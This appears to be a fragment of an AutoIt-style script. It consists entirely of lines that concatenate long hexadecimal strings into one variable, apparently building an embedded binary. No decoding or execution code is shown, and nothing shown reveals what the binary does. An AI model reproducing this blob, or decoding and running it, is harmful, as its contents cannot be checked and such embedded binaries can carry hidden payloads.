    $sHex &= "BBDFBEA868121668082C8A856026013B30F6E3C9B7AD40550CA159BC855C4228EDBD468595112241168DECC3BD1454088558187D0F48BCDF67E01761118B3583BCCBD899E2197B6F36398495F9BBD23673D3DCD3B458848D60A918D9B70DAB5D3D8969F146C1BB7C46CBC723058148EC6E668911BD0B287325E99EC1892D13F7EBC3E71528AD38B02D19601D2369DB1A9F7CEB740D079072F048A32E0DD65C5D48101BF894108784E6334959F0740D8B02ECD8C031AF838E94E4FB0634017D148F2BCA6800FF1E1CF9345ED20BF8148A009F8083744E6CA0049172570A071D9A2076093325C1529F9A200E301020B2C6711FDB6EA150792EF02D75EED614627F6AA6051CFC32300D269D6503601D37EC42AFC948E2CC4411CB95C00DE414F0F1CF074333BFBA080AF3FC5F6015BCD364034A1105AD6E038B81BF7BBA4F4CC1740F6A0675DCA33FDBF20190620F848D9093CA4C3F8C8078CAFC361057C65C724CA9031B7474D274379B11BD0B1F7D542C74ADDC91DEB9F68D1F5994649BC3BB8D25EB32EB2E7D2F29E597025B6BD76C3581C7843C0DDEBED794B9752714C07472962D887B719D8984048BF7D38249EB8B41B86B499ACBC80185C085051789E0207D1F1BBD23C9C0AA38EBC91D815010A15F23C2011693D9581065614AEDBD6714DC6332F06E244174186931354E3532DC4BDB8F0D6ABCC8DF6302746C60B690342FF93F0D8CF18D6A0D75D0568DB70C4FDB9CE79FE10BD9DADF6FC183EB36690D3B0293EC215730063F210C02526560ABC0139FDEE42B0CE1832E6F683B45FCC74001A8234203BF4F28503B62B7810DDF610A933458B0D3164A5C53984A21FC3BCAB8860FA250E7753082F3BCD9DB9C18651715F056BBFB1F00750430C9DFAC0EE610EAC5114CF0F4DD1A9F6026CA5C205D51BB85D31DC54EBA73390C3C109B6D3DF13102992BD0663E9002E00154D3007041488240A5067C4A70CFA1DA9C1CB781400B041D0395444B5FFC72E70FEADB6F8D0A0645E40BC266AEE27F9AB0D416C455E423CA751E7667C6133B83C178409EDBE15C6A9486A5452F2F20FC3AAF2C84F0F7D0AF0C61F702C223D0AD0C99F7D18F10FE695B0A23C1490C20D8AB0A004F65287A2DF096020A9EF6E0AF403B390208F1042B807A00F64EEC9B886105F03333B4C72F0AE00BC80C0E1E7CE6E0EBC61B3180E02300171A081088F3044B89B41678525A7289412E704314C1590B1BCE11C3EB7F91295C480C4164F63CF00F1D0A4D81E16B48CEC8BD369D3058B090030166672A82DC870BCF2C21B02E117F4B6AA9501A233F321A85647C6BE6C0631106C06668FEBCD40486C1B302D53060410C2C071D2C657AF5A138919A49C4506C53751338827D15C01401881F56C252810B419E756DE0C3"
    $sHex &= "AC418FFA0725224010751013F2224ADFBEA283DE002D525056CD010F25F68BF227425BB7196712AF3AD17CD4F234E3BC8C0A0624F4D93A243F731C415830107261952EB41D1E104BD9DF6B963116093745DC1064BBF364EC9209EF6891104D7E3998C08C043411EC39F37DD081A4761AD07614EC63F54897AE8A2B5C3018783DDDC17DAB852B22CCF8CF17339AB1A5CB1027EA0D61833118B8B80A03E55FC1ED52C808F26F5B3E060E64A05D79F6D6701DCB6C33FFC46AD30D9C01DAFC731F103769456007034A5290465D1202E2A04ED5FFE5CCE3AD77466B1E93E42C315B1D438A74F87D9F212F9017E4BCE54C142609070CC36D26F177AB1C148D0CC213F029E2CAC31BED3E702BB45136B1816A6D32AD663B6A1117ADAD35DF300A8D83E1107520C50C6503C24BC2473D0E0C0939A3225F462380011C6348E048D82335041A02786724C97F0C0C0C8563F85F05C89F04AA01546212A80CC82CF8F83310B0349FAE0BB069C2D9E003EB512BEA022F0E85D1CDE8EC8845EFC07B1A8DE014B8E7E4C6145EAAF67557F4A531D443180FEBD41738AE25A98A687F44DE9206E62500C0C01B089C89C081C9AD880AFB446C9B5B1441012D13847441358D3E520BEC5691F460E7A33FC9090712E3C32F01176E4ACD55B380118120E104AC260DEA576F692C2DD8C092F78CD0ABE82E137DBF24EB221D2EF8D2407EDC18EB160FEFAFB4F0005ADE45F80F9C2CE162323F20F00AA1D15F1D0174066E01571BE337EC5C0699E6E739242B00D01ADB81072393F04090A320B90B52B3B489F775F70374964C78307C310AF8FA40E0397F2B5BFCB905CE3411EDE86EC24C044C30F9B4F25481706BBEF8FC23E11BC4DBF88C299C0A7E8EE338853EEC1C2C34E4B8CA0A47A44C329567B8341AB70806F4B127EB5C0D63B82516E7CFEC065633B05FB8A5255DDE102C96A6AC01E17519F8AC7B9AC61BFA0DF9008D8DA63C007DD451ED035859636BB3E3B73A3A211381FA562E28BC887D8870884E688AFD8CFBEBE0515A6B0C6EC35D4C36D08415E38AE07DB0A28A1003D1880F672DE29D4BFA8A51292DCB5B76BB78258A83E845FF88824942F9839495F8018A0D3BDFB3D734881173F98A8293459B2E97B6DAD9520D9091B648C1E60B33B2FF992D6270CF0C9B9472FE4920CB65C199C5A7FE260021907FC1933A1A69664D403250FE0823B06411A09B3E067EE85050E90A4CD0FF6A092F248CC2177A2F5C9D6B4C337F2C800D2C88458C393F731B536169FC5D0E1B1EDA40B982E829350A04782FEF07164FCA7F2D7D8956822C85D8C528E0334BF816720B9B11B8727F030B0C86C76761ABE0D643C166E5FCF7D918B020D852BB1EDA52F341032D06213D0DF5E0C0B0A4512FEB62DE2F8DE5282B7399F73D18"
    $sHex &= "DC83A7BB76717C8F1598299E51B655B8230C90215111480C410E0003DB030103445F100BA880AE45B0CB715DB07ECFD283129BC2999DBB77A00705B4EA055900EB81B04AE1A0CD619CF41586E9FF55F06A7B0F6C11752847B042A3A3E80845825FBDB9B4D6C249B0700CB4F0AD04A510B233AC523580450D5F2F885D9219255894916E0AA7710B4B3E5F45ECADDA87B05B7F001C83E3801561C1895FF4821631BF4572AD8D8801C1B76606704101ED75F892BBA462A115F31940D837E616EB1A2B8E38C19BB91517D448A85213B00A35BF1A1634028D3CD139808909C2FF08BF74E401FB295D094B01F700F0C8073C0881C1FB500483C04F0A93D22FCCF4009002F57200B0699F8CDD580A4D412000B77DE92F9ADC6A39F2886B9D02720E204241863B331969C927EA90DFE824D114493C0018B089401D53BA43C0CB3702E0D8DC4059202A8C900E3F298FDA25E1000CAB9037B49BB74561791D315821331C2B853FE17DB11C5A06F07A750DF1F9D6476562EB0BC8F0EB7EC24242383FE0F70EE3AB443B06028DB86A3A6A0E17AC70EB06D308289CF8023D0DDC2DDB4535057C53182CEE5AAFA342FC41074A1C1D2D181249711F6FB0706520236BAC01CC56132A52A20FE185D099B0104310E7839CDEC76B23F1FF97A1A66EFC51097518561EF20F87750766D86670614DAD0844AD3AB15C52FCFC01F695B3C2FA107D4A666811782ACEB60A3D0288600C7075B6DB2B790B68088A90DDAB0555104457CF1BB26C66255502166D4CC96DAD17257101562E58C89458752AD6188631750E0703F916967959B0036978633B49EC51E2C7D006A07E0E5D83F92F7490A5E124218735E31D64D1E0CF0F1DC9042BB8CAFFB35A08C3214C4C2901FB12C24A8AF83D838BC143E9BE67DB31CD3D7515634E890262DD7907EB49343EE14B3526D69D672E3CF55435135D6D211FAD4FDB5022B461A9A5DB55A599E004D2074D3D740D94091241006D0DBDB5EE6C66F87C3D53A5674AEE58D2F95B6F195342A664525D8D0862C574F445D8AD2DDC7B268DF4751C330ABB167148017F63C081D7C4C002BF5627A2046184D0235EC775B107C7C42DF7351A37B803F97111659408C7F2600A01EB13CF7651B541538153C9684FD17204992E75325BBE6926303DE0D18297064674FD580E7669605C075E7C89036913C16D342B2CADB00FA80F812131844506AB560F4D93810332B3C561604802B7702EC0826B67820D56C746138D46566B948A304C3B63D7C1E7B8A16AC707ED5D78413040E805B3A9ED411CB85D87E27A581A8C4CB17995A3198501012B5880170A6F05ABB99D61681DDF673E7E11D184595881C70A3389014716521459E19563785198B146F03A40BF2FF0EB7D48287555C74F38D81105E5168301"
    $sHex &= "AEE2FD5008F82975CF0B4D09F6A74BABFD1E29F83A751A978275D8D7411CD7CC8512F71108649BF64A8516262E4B34432755137C57394183E90289A8D05617213D741B1AF85AEAB563AF08C7EBC4E30112FACEA0E74A83CAFE42811438ABB4069D8598AD8345D96465F10138AAB1D2430BE09C5393464B0114555B674C61AD0EE7E379B6AF8D6F5EA306611CBDB33DDBB36446861E602697065F396CEF3DCF4C857226845EDD1E62599EF79EF7980E7F5F5E5B0639C9C27B9FF67E0C566563BA5E5006AA1FEDBAE0688E190401000102FE87FCFF03040506020708090A0B0C0D0E0F0410111213140419B14A9B40150E16023F6058AC4F19171918BF1DA9DB78C487FF687D18AD0C43F7D0F7D2CCD05358C5986611A986BEB010FFD1F2560AA9EFE0C24EBB352362234E91AC11A32EFCECF2A20B0A84710432C9AEB522626A1F10A957258C996D46890C69554E2E2A0C02A007844441A4260EA0096DC397E0594A05BFE1466804BB2D48D9A844A69461DB23FA0B4AE308B5C3FF08E533BE08E35706E8042195D0058F9E0152682162CD208C21B359376C3C90FCBD402F443F50DDEBCFAA34B102F9BFC0134C467F0C7D42C614061F57A01BE40A1A8E54220C011B2CA261293D7C1DED26E694B06ECF183192A1F0AF7FADCCDDC099C91CCC5E0FB6C038AC98D83DDF7CCE605C80918F6A8D9FAEC4324DFC0C183B8428A4B1C83171342E2A4C626C0D66C200FA1FB33A207DC1F814823B14B1AB61A1B771DF61047ADF9F7631184D140A3BC243317323E39B89F950992CFB7CC815568296011DBC07EB804AB4AA21015F9A0AEB41EB65F0FE6DE0DBCDADB655FB00DC26A46D033099B91715D6F62843F0527375740D0CA9D055F021E2355117AFD9C229B729C4811010F755256CA3A1097B314914903431A80C3EC0C31481539FB8E3D640F854CDF06B0097E11BF0F057068BDF54F0E327BC4E436C5F038B06751029AC8230BAC45F7412C324404EE020511EED8271D300994C83F81AF44398F4F300B5EC692F2193BB2AA8551186D1C4E512692AB880E1C608A7596C6517383BE525CBD856D47A10C14BF6389E5D84124DC6002287EBAFE3046B77C401C602227307465188899FBF6A63E0A6D3297F90BBDAC6FC48387EA1BD164F06A7A15D3C7B32085BA27F459FD9A2C03B132ACC3B3F94482E92030103D764C0FE014B481712A71D2B0C310C6EAD81ED6430354E1CC39063956DF0290CB4022185A86B9399A30AC4FF971CDB29AD755B2514914CC994282C531B90DF1148012B6C102518627830251C7DBC45C092C7D25F0C006E281EC8592B5F02CE20DDA826443883D85620FAE37F8B6DAC1DF1853FB786318019A47B9D601C03BA3E971646408A519E77821ABA9588C09C0099A56B5D0C2B40"
    $sHex &= "B68267546205FFD1008303BD79724060E05BE3335F595DAD03D0041FB24138A55309992CAC058335081B2C71B3EC35603C8DA911A91C9B1C95C49A4D1F0452C4EB62B51C54116146E98DBBF49F2DE4B7CCDE04B8CC1AC246E09F0D092F04ACC5A33A10222F3A049B5E6CA38C314C268E6EACADAFCB0C1439EC2EE898218BBC1F22910A215F375B6FB863332DDC3362980A50035B0307C6B67C3A39307D4435540837E3A54B2D415869DCC651A3F0DC925A0D1E1036CD0C30920CA75F80710C5D12EE7CB2AA016DC7947E07378233F3764B3603012AA21056829FA9300EA651953F3BE5027801CB57FC6B12C6403706E1F41552191F7706034087D2858F77A19443673871686B25808B3842898CFB402B6F1281D465B2709139165F3627223BD1536C68B24DEC8C02C269F89FB9556B0CA82CF4A3E105106240D3CCE5D01E520AB5F473A4F626BF15DCEC1181FA659ADB0DDC77ECCE725FECADED507813188234529D1DBA03989E37028F88DF0876411F0A2F4CDC63592B0A8D4A84243280247A8AF28470FC11917416951398B86D3A2DDCF0D81DF86C0CD838830162C704731C110B57A3667F20E16A1B0E64A5669A860CF7B6066678AFCCD2959C1D0CB3BF04F654F4CD58BB61238C0C10D717258771A3758EE91A1A89C014B0347A34FBCC90FB9EE4E433C2D76957675A6398BA9D034E20169B84EF50C295F46C3AFC03FC8F3288B8C5BEEB6A5CE5B948AE0A27E0E0826191E4E0AAE0305E8278D2482F10381087B043D466A776F0154F940BF8773A3D62D29BCF404B4045F8421A33C9B6BE84957362FC78F31D34AF04CB4455F4511EEB75D1A650A4FBE28C9F244B18A2B87EF7E8663F13DCD3EC7F0D11E81AEB0BE9F00F1A8853B8F01A91D078949670D36A43A6C792C036751EBF3660A1B5BF39205D74361F44195F6892712C437F5F58D8002321DD98283198BF2D48816FE3C14B6A3FE54DC24C1DF4C5256001278E374A425A57C20A487ACAD72456810C59AB60A20581C131B9105E20C77F1AEB100881890EFD2835046855099F241872C423336D0B2D1E60CBF94A09788918B2C1855559F08540386CBA7E0C2043B0BF35C13A269E92C80AA398814A274CC38CB87FEA55450D317D4ABF4D8C2A29132F82B3602E09B4AF930C7219FCFCFCA28B0A710BBF12AC64A031D207630417904D0F90E482434D17C12C7CDACA07A978C780BCD7E54C18965E4ACFB2EC430A52772F1E58D7143C26AED408537FE123141C096937533FB314DD1970F4444C7230D2F4D855BE315C13FCE7DD14E301E3C20E4A773BDFAB8951F3130924F6F1EE0A0F93088D8BB8329120947F20C9ED23ED01793C8BC04A06D2B6493D8B367E4A377D4CF517FF32701DD94A1F0A01EB182E1850086D092360AE03C60F"
    $sHex &= "0A901029E8C550F79D2CC80D77EB8E8B097DAA1C72C71745748CDAD450AB815FD3503E641C834B3CBBAA656524E90403C8883C25CB013C2C82BC867EBB01C71E67E0A60730953EEDADED9C5A27873BFC7FB108A35D651191F9E6493C477F1F17158D7A1997E68C0C1F9C6598A342DF218433B0B9D9686FBCB22C1B88874A8B4442BA1B72E54D50EDE35DD2C3241E8D55FD554830CD4D419F1916C64B62798705C38A6F0DA87C2133478617A527B21C23D968457F3958FC33A055189F3FD06A6983F95D491403565FD0388999010D0EAD02053D63B8EF1F366A0D979079F994E1420231004C9A7C1001E9C094D5194B042D415C7BFC77E926D7451C611BEC12033B04DD110153E8BD40FC4DF4481F9A070DE847C2FFDCC1CC0086C944D52633AE8CC3009CE835834FDDE953AC79BCEC7CBDA72EE83BC42F9408EC55E412C2394393E45F9350AA216715097D04E25FE7C645E3FD018D52D450981267DD97F0C3FAD50F9151E51B6414621AE3C118F5160248EB16B60E50A11BDA20A355450C70413F44D93C868E8A437105740B6150F675140E1143110BCA99D6EB1BC77B20845EA0CB409CE3B1619D563FBB647A425F0705751C7D9C800BEB37DF985AD280D7404D5FCBBF245614A4C61AF3BB3AF9134A47D00C5302C97F35038AA78D2BF6435C131863CE6D8943620D0085C199C6957BB3E8621213DB15331CBE6CFC6E274889514C596325BC24844A4C128682CE019199F72F6F116B102CA791F13AA16144FCCD47DCE918E4D73EAB0F7A8E02AAD11862FCF1C56D11437563A561704DD32E3E6AC175D61F6C87D48BC756C9CF0BB0115E757354632026D811BB1A6F3B67086C7B815AF74A2075A235711151748F759B461B1B791499B603494C1519CEC313CA668960AEE01CB6D10C8FEDDA28241E6849F03B86D1396ECE7C2A7FE61FE06AE8F6ED3A761DE34C784A4851FF150047841CFF2D0D217128B9F06B4DE9F5F6C60DD8F9ACCF76B90DE8DC128CDE7F0AFA95D7BB04100F82D2C77DD883E95D0ED2C1F25B4326CEEDE1453C6981A71D4367B3A96C839BA1DD4553A06CE83A6CD9C9EE8620DF896D75744508BA6180196A6CE80F4BB42A0DB0F18E356B9A0201D032EA45D8FDFA5213BF33F62BD11BC6ECEFF103896DDD95D94595305631C37CE43E2DAC84733ABF179FC6379AC24CDCB900DF420AD33FE421F1C3120EA44DF0AA07CC5664EF7E7F1A0CF33140D30146ACBE307197533A908D55F83037925C14343E25B45A9F1FD3630013F16A1108DF09D509885FD1E12E84DE483BAD8C11C0A1C1620305181810DAD3B2EB8502516898258E9DF4253FBCA5230C423F0DD415B607B86FA8F44702025D29D7034B2BE0187350AF1C8CAB8D478BCD3323318C1320598D81DD8608052E8589"
    $sHex &= "B67A5694608137EDD6FFAEE8D63A89048AEBC1EB9C659092C406A959ADDD911CA5D81841411C040E62080707FF19294D4C056993896F30F10F787233057C7328B8494C0ADA017B2B89448FEB2B5FA7E2927802368A024227B06247071357CC243F0EA71E88D9842341B305C42078E049D87F42D0BB90457F47D330049891FC1B2238F8FD9471A8B91576F544E5063F4BD2E52A290087F08D2C4CE3557C04169EFD11A93823878443DE05351098E9C0DD4B300856BFA9F0B18A3149FCE4FFAD2B485C1B42112D0A12BF5185947D7315090143E53B51A2844CDCCD01B40A893FED2A06B171111B0C0F068E8DBB5B520BB8EE5BDC1F324F9C097C260EA410405FFF60FE2087225905775E11A93EB222018584FD9EAA560F3F0AFC495D91D0D30E721C103AD250DED3C110203A2B47208ED593501F95069EC605AD505293F70E4CD38BFFC4250679A3D8789E3553449F915F0BA81CFF88E79C58AC1B4FD231533F36E1C4080552CC2DB8201D822E0B6542410B617F3F2B16F48545FCA7D80EA450EA0C0C31288FE80349E61C1A04F901DFFCFED6DEF2753DDE6904DDDFB666E211FA6A05AF6021B14E01E542F8BE21CEE89EAE56BCA8880118D9315A57DBE1B90A051D8BDF7FA0CED2EFB87486F274B7B160AA8081A01B580428DD2BFA03063591755387519057AB3764288783DB8553810C999E702B4D1B0BEC11DD6E262F8117EB0C6CAF87918AA01F09BA422DE068E7F005E30C8653E9FB743E8C663406E75B0403305E253804EBF03B7EC0173ECAAC7C19DAEC0A11A8729F9779A54F5A1C63C95861D81451BF25B91C6AB11B1B44556C55E3D280A5F2293F6048249922A701215501296DE505B85440FFE930270A0DC03F059C670499C2235C7F06D411884EF0964A9E632625FC18813854D6618A1D9280495A21053A165AB36196A910236926F6A78F18018810E392022E4AE203C48BE17460ECE0A2704405A737FE4D10EE2FC087DCDB45DCDEC169838E12FB30C23EE0E37607168DEBB76D75E03E3496906E052025A18161998C7D4CF89671147378C3C038DBACECDC684AD6ED10F9284C5DA37467218CA3E62A791C3AA0967E8888502BFF145681805CCF51B3310C36E94145F0DD00468D047D24A4F09A750B490402C051EBA22DC8A76E13EB8219D1558D7819C0843879C4E0E823B5D7DFCF5D02C67A051339C95B5EE82EE1ECBE03FC79621070DE902CA97420E4959FFBD02E184EA92D17D108E78691A823125E621A2D86E0EBC750E492063DD4D8948A04BDC681DCE15660F9F91F0C0226CCA9266A87CAA77F5F51C9FDA4033D0C8C11750E6D7C41EC68199FCC9F837A62245004784BCD44B0543E347D1B38EF40606BDDD1807C296EE5C0E8DFDD9F1E6111AE301F831141AA283C2AD2F8"
    $sHex &= "85D1761AB3BBE03C193B7FA2106B54D2A36A6A742F89CBC97151206208E1BF009E58541909234D1874489F4E546A955676685C09EF6923312C201CFF8595A1FCDF06120CFEF00743ABB3D40B54810C088D368E548F7FC18B381BCCA3B1B979E3532F174040EB28E08D379274A8105671F3975F10CB5DC2D517C931137866EB2099041FC03283C60ED3A574090A1433269808B802AF0D4B0B1B6FC21A4530ACB1C2858A5018982601D8856B142371D66820759FC1BA94DE21272B7FD88EEA5C66D985B8830C4C351BBF9178B0AC65B13B21512209E3D9C35BBC4134B6EBC93FF5CD304030629F3D088C04D24C3B4034E226F05CBF0C59EB847CBAB81A571BD190ADC2D0D2D3275058412A2555740423555F91BD40BB302F817D4895950E9F4310078D29EDF4CBBA9F2A88F07FD2027D0B33F1175A4978E8869F2314F080E89755039D4ED24C0852C0521A8807B45530E27F601158318403D0218607966A6894995DF0CC9908D39014FBC8830DF8799001E77F149C4CC85479ECEC560B0C680B592AA04A8C02E1C09961C44159A7C68F20169482F0AD3EE4054187D45273C18B61D8A2529FEB11F921840BC4393C5510837A08234D07923F3EF01008CB6E4E2B11C58FDCC2B374CDDB5510AF1A7EEB6AC5EC216716F4172C0C477F5C7D60CB3094D790EF21F4861486AC11E88D5408578A7024530FEB6242ADA5D0930CE5716F68710C82B6C3207509F5852314F3864362E08054FFB477E8A431707537C51818A03E01A5A3475C499CF47F1818BF0280176B806F6D0C9BC0191EB52B934E68E6018C1FB78B71CC84DC25F39DE74F311D82FF5E8D3E773B855A0E41F9A064FB050D2EB49358A7A4EAAE3D0FA182112181B304D0F30E15A7932306274DBB40F2481600026E458283D01001FF91D0CE407994488D84568413C921E76E29033A73FCD6800F1A5D5344E081CC2508EBAA42152EF6AB4F0CA7704B04005F3D6D8C166224E15F1C0B52440808250CF0A0208691158D48ECB13BB310CFEB13299D30EC882D24C7F88283D02C3F016EACA007E9839D1A4DC255F3A31661740F62B615E0149410153503C8914069F0B06081AD63B68BC1FF5A00B721F2A16FAEA500A313DF8B18B8B82A4B701C0CB01BE180DF05F0A1764C6BC4AA127F7BC2B4C1885C1124C7A8BAA476DD175FE3D2C046171C0360C481633E109D612CDD119F0CE3F4206C082C504767015C8652DC7DF069A7E62021C812533E40E207700AD68CD080F8267023BEEFDD9BA1AE0AEF1781DA388842021F8341CD0BC2F9124310FA4D01642F8AAC6A037E1D0285B80A527E03D05F09B0319153082815AF01798957675A441857A97235F485163A8E69344FF57A094D784078124022E847F81E8819172BF0C774075D724D12E8C7D5"
    $sHex &= "0221E99E48FA1E44B003A06BF715288A9E84631A97B3E2417021E1854C966169449828BE9D0D20850C620C80B0FFE0BCD8641D1374D405750FAB6B6A40A4B8504F2A141D8366606EA2E14AE1D024F732705F8253900BD005E943349FD7740E243786DC6A28C026D609E0ADCA06B5E55E9F3D73A14A0FA7AC01F9C8AB92DCA0BC5308A78EAD4E019F536CFE89704D7E538D4C82240A1BCC0063E50A05A148051F9A88B58907C335905A3B158A148F9790588A5FA390480E5A8BC44A0612C78E7B162D158F68783694B1034562B411BFB190D86F6BF455F7EBDB2331263AA41EC645F71852CF2229143BC2C3D307EB24D5223B8841141C8AEF34C0F7010223151FC13012A3BB400380CE0402AF124754436B7AA1C1FDAD908EE0884812F112E9065614ABB73F48F3C75D258B69D09C083DB8D4567FFB7F45F132178452202B82AB84DCB1629FE3F8C07C6984D602CC8E15D182075FC11A969DDEFC025BD11C1F41512A443BFFBE8E9AC20C154029227BA30DAA977E56F508D0231C9812DB0C8AB894D46D41B11BDF58849E42334084FF646FD304704406010BC823D11C6A76AA4A03FD72C25E4DC04444DF3CE3152C8F887F3C7FB7640A81A1086F85A4C6527539E31F5B0C63582B233F0B2A2C076CFFFA1217094B9CAD116AD520E0D5FB7D2C33C04760B57F890BD358819E55281A9DE4C400545B2F1088B65DB46A19A66E3CEDD9808F9978746D8B4B6AFFF01B5F371D01794C1D33B02AE1611EA1E966C07BA007D54E6D40B82C8C95E0D6C8853E017A1C2EB6011142977D00F1A5606BFD11CDED393C8C96BBA6497103005C72ED412417201CB08B382DEF48410E154BD8717F607D643AEB371F30D35C69184A401233D14798611A851373AC830F6CA590516D7D8367198B80E3D7611631C85C605B159A588834251FC08DF361A3A4D4F80A42257B5F7C760928C5863D137C3E918E24DD4E0934AE48A49FFA0AAA47266BD28D5C8170434A9A3A041E52F0DFB40A755410080B540E0C751DFAF0C5BFFD4B0A71488974020C494C894C020CEBA533D8588DC29164D8AA3E214A6C4052425451A6525808547522B716503315023B9C250058283C4E74261399185DC11D27025238055C2C084D0047C98C9628327F500742D1C130C7867C1903E033B930AA19996D4F1C712B1C10C39291097C14C1066BC96C31181A1A0FBD811C9A361E93300611F54DF4EB28B432DDF4014B90F8B0AD8406C27340934C7066190412503FEC52B75118B5CDE5BE2A8DC200FECA51C851F8CF86FD89484CEBA640E909A121BF0D344DF8BF08581B474C4E45DCD13595811C92866207C3462C5D147703581547351B8CA9761177B159113A6811B73E3C358D37C27F177C0A4510730B12C6086CFB9008DFC02279704E4D"
    $sHex &= "BC50987C177F0ABB107642E8BC242D0C6D5680C91AA19F7A00BC1F6306E9CD1D4D9A95C38F7AF87083180A1FD7A3C1818D877569B7219F0056041430B8844BFE29129770DE8582BCD7707023E573DF2F21ADF17D82030F4F68DA7B23BCEC1135E02BD89577E4C80DD07F00837CFDCA0DAC1FEFAC15C2C4651F34E71D8643C60FC350B70DFC657D0E451D944A45F8504B7A6A819F34BE38696CCD8B01A3EC07B9C6C3D9706A2410D08D55DF534F5B0838E7A0345ADB7A46239315862EA496730FF36A618BC4D3A674B727DCA63682A5488F1F24045545B80A0D2ED6B1618E6640610DB3648DADB0875551551DCCF4FC5468BCCC160A01741602C13C028A3C1EC2F8FF9A8095D51D10C3296066E3C5631455AA04D6739F93613564C085FB1C3214A72DA4FD074EACB94BC631FD689D0F50C627600905C73E9283BD05B4EB4C87C462847C167F9B642E135B61259BBAD2F4B2C06103816E023CA80723590A0AD7FAAA301E21BF0811C4614C61AC0175D2B3D4405C1B3C4CB70114001E31382BB51B4530CC9CDD3E0EFA9581AE51307D290B5F137CAD343444D104C91895FB7B4AB8345A6625A8EBC3D1015A61F410FFD04622F038F92600E35C15F818303FAD5D93A3FC34217B7EF1FC01A5F994C2A884170900C10BB3485A9AA519FF3B000CC51CC53A91620D160EF2D30D0780630FDD6AA399A92BF18D8805325E115A4C40E43B45E4E06CE2C62D99B9FDDD8E007C34C10E196CE1BD26890ED72200035B4802519B3017E0464383BF7894AC641C0FD1E0B3D64C71EBD9174AB4985263853A7F421B6710CD4104FFAD8F0DE532C68D14C8794A2DF023E70C071300DEB88704134901718155099B37FC829E97994F31772801F36E59860CDF5C489F302C50083A327434F02F411983F9BCC7ACE3B09B11F50F14D81642DFDDCF58432062DFA109A0D3780C2A7D2406AB7B28A8660961AF5ACA6825CF988481FB83C11BEB67EB60A135B226E9FBDCA30F6F984BB8080F772213A1AF0DC568EB3510176003236A084637920F900C61D864FD94DE24C571238315DC75550131854DB3803489E3875917E9C63AF4084C9998AC34A351104C6985C26381A3FBC47F007E09810A027CD6100C250747232E5628181CA30558ED4C841D10D52A9889D8FF0769093C063CA8DC97743B2C7914AE5F0AF8D50DD66089E0386930A54B1A2C10D9985C45683F90DCE0114B858D456501888C9E60B0E0F2A8B31CF210F64D2957552A96A8D0072897236F7A0CB0B400B82218BD6015EB380AEB83A5C03C78381FA5A4767694DB043048BC211796C5EBCA120FD74047105F22E8B9A4B5FFA590DAA02D4069A31883DA3176989C25BC35B49C5A98518D959002705901A2010984050A655E1540C480AF027465A0DC6DDBF2"
    $sHex &= "12302643DB954A80B6F7ECDB857B4FDB8482FAF8F80106F9FA1CD60A9B00FB002AE9A8842178D02B008C1B08EB1421142D58299091DFB316B18130C37FEE144600F6BC1F6A012A3835462D061774C2D1016E16680F27F37D1A0FF99C4B4083F803AC11D5E880D1470AE7D22515005E0B235A546E145EC7D81788AC111A61416D86F985853B3116DC95583FF1F12AED2801B7F4F7D8416F5D027C06CEAB8563E06C0CE642295A185A02A00D48DFC6B600CCB0422B1B58DDD08A0C891F1C38E14B3775BE05CA0F208EAD8D21EB00189169A11257F86BA5630A8D2404C610A59177957B7D1814100CD5F6BD222475103F2B403B426808B72BE50783D83161A2E2E410B54C629A4E02086699FCABAD0863A5DA54E116F894C1CC9F59429086220E1577F46B422BE866FCD50234698DC76FC0601674BA8325ADD1916F25E0D2B3208F44F400D2A318768906C510AECC2DFC858DBB5291EA10A4C4EF950521C2808890EB359CB2480AEB214D23A0BB0B7A82EAD18043007420C444DF640C3ED559AA18AF6A3157FA0684021F5AF9A4D7BB8123304A1C234D8A7C2AE18353F47C4139168E70097FD13243FAD746490C8A540116CB41391E07E594FCEF2E1D29227F1E1028DDD225E53B0F8567E1FB5C08822C487D4D4B2C5D21395F51F421A01BF0E9231EDFA3700022676FD4DB7AD0D852450461EC39231D8C7C9C99D1390C2667B5DB008E6A6C43EF2819FF0CA415104301960B61958BB490680DA1093D5CEF30105362B3B09293350D60852B0F3A1ACAB1F0B524140FB7B46AB195F8C741053A78BD301386A14364691C0A1F6872F0E0B39396300B6BA6F06B2DD593C7487CE3E18C7C49BA2A66FFDF7F20A19E82763F7F046A34D0090CBC8136F74B0AAF758EEC091273369A00592030490CA823BA5F08B1A909A7A320113A39266D045FF1EC95AB53FC147D408B1B54C124CFA78D956CF2107C5F72B70187BCB396045F73A25C504F35EBACEB293B5880926F5DFD04E5E836DFFC38C8295E99BA4DFC140F8DA22F61C0034817286ECDC1AA02AB04F00827CA0AC47D7347844C2912E1034A0C1476EC6862B6709E7EE8CDAAC00A44881EE884413A4BF8BC7510D00A6B2B7F10EA42EA45D291296E4B81D9B555F0C60D2F11E8AA7C0DCB1608B0E8CC37944E1DC21FB2ACA6B428CCDBC795541068E9FE9CB15208C5C221646A537B1425084B3064904FA60C024F3C10C841861DF3EC251CFC7C68700E32208F2CFDDF4C408A5935DFC3F5241D143327963A6801962CE1220C8DA68D11DFB681FAA9DD81E1602400916ADED22709A320581ACBDB0339B1977CD073ECD3B3DEEB695B0427E241B8D1A91E197C0052689D0920F11D125E2B34D9E2207427959F377BA1A17C1883E413B0C2E0403276042D74"
    $sHex &= "086D40FFD65C660AFD240F60389B3EF4DB52174831F3505AE1071FA95CB98C50B02EE883F4596F5CFB607A10914BE89B35F8D24C02CEED380375F030464987FD954138E103D728399446861E69BEC88BC6A1813A2B9BDDC419DFE48F3A3411807111089F292DB886D23A25111C81BB4520DC6546702E234360515DABA4C9B190421FA925279F54A1FC540E574C3327F48B9CD11B38510185B72E890D7C1EA708FB01FB1B17749540DA1C891EC062034ACADD013C18179D2304D02564A969D3F6208230D4B52C50241CC01A80DCEBA523742D2165CF1A8022E8E0448D5D8B1C0CD08F38453A360D908F2179019042B208BE431A0A2EA1942703F5141ECA38094DF86005B3C7C528290A07EBD6D669B779CB54EE0AA059664A5038D4C76201A38D61C8D8C0237DC73BFF0A07716DBC93E803C538D840232D2651A05640ABABF5C70AF8F7563F488950504408C233EB283B2FBB02240E9A2A85EB659E201560C0C18D2F4283711C10565FD870C6236037FF385158761201C448C34568755F5F028485D8C07D130716E444C0074FB969499DEC58E04EC7C43883DD6286A611AD142BA7A5455F82B88613E0FE2823CC499DB84A480B484C6D60391288FC854E60C0CB3F6099E389A90174171B04F001E0428105840C76809D1BBF4397EB37E163227490631775430208B871C84220B5120209934A205C49E72D84915C083838A42E6C053D4A2B805542F8F90557039B3EADADBF15426350033783BB38C4C1E5CE40295FD480CB48907741BA1B0809188CA066835B87C64457AFA1393D0157004580C4C008A60A699D14A695F0CFA05CAC6E9FE8C3490FC241C9A26